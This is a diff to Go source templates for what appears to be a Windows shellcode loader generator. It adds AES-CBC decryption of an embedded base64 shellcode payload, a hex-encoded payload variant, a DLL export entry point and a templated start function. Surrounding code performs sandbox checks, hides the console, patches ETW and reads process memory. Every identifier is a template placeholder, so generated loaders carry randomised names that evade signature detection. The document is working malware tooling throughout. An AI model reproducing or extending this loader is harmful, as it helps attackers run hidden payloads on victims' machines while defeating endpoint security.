@@ -19,6 +19,13 @@ func DLL_Export() string {
 
 	{{.Variables.ExportFunction}}
 
+	func main(){
+
+	}
+
+
+	//export Run
+	func Run(){
 
 	`
 }
@@ -90,6 +97,40 @@ func Sandbox() string {
 
 }
 
+func Encrypt() string {
+	return `
+
+	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
+		{{.Variables.length}} := len({{.Variables.src}})
+		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
+		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
+	}
+	
+	
+	func {{.Variables.Shellcode}}() {
+	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.fullciphertext}}")
+
+	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
+	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")
+
+	{{.Variables.block}}, _ := aes.NewCipher({{.Variables.vkey}})
+
+	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
+	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
+	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
+	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})
+
+	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
+	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})`
+
+}
+func Hex() string {
+	return `
+	func {{.Variables.Shellcode}}() {
+		{{.Variables.hexdata}} := "{{.Variables.shellcodeencoded}}"
+	`
+}
+
 func Console() string {
 	return `
 	func {{.Variables.Console}}(show bool) {
@@ -114,11 +155,15 @@ func Main_Body() string {
 	return `
 	package main
 
+	{{.Variables.ImportC}}
+
+	
 import (
 	"debug/pe"
 	"encoding/hex"
 	"fmt"
 	"os"
+	{{.Variables.CryptImports}}
 	"syscall"
 	"time"
 	"unsafe"
@@ -271,7 +316,10 @@ func {{.Variables.ETW}}({{.Variables.handlez}} windows.Handle) {
 	}
 }
 
-func main() {
+
+{{.Variables.StartingFunction}}
+
+
 	{{.Variables.SandboxCall}}
 	{{.Variables.hide}}
 	{{.Variables.processID}} := uint32(os.Getpid())
@@ -362,9 +410,9 @@ func {{.Variables.ReadProcessMemoryy}}({{.Variables.hProcess}} windows.Handle, {
 	return {{.Variables.data}}, nil
 }
 
-func {{.Variables.Shellcode}}() {
-	{{.Variables.hexcode}} := "{{.Variables.shellcodeencoded}}"
-	{{.Variables.shellcode}}, _ := hex.DecodeString(string({{.Variables.hexcode}}))
+
+	{{.Variables.ShellcodeStart}}
+	{{.Variables.shellcode}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
 	var {{.Variables.lpBaseAddress}} uintptr
 	{{.Variables.size}} := len({{.Variables.shellcode}})
 
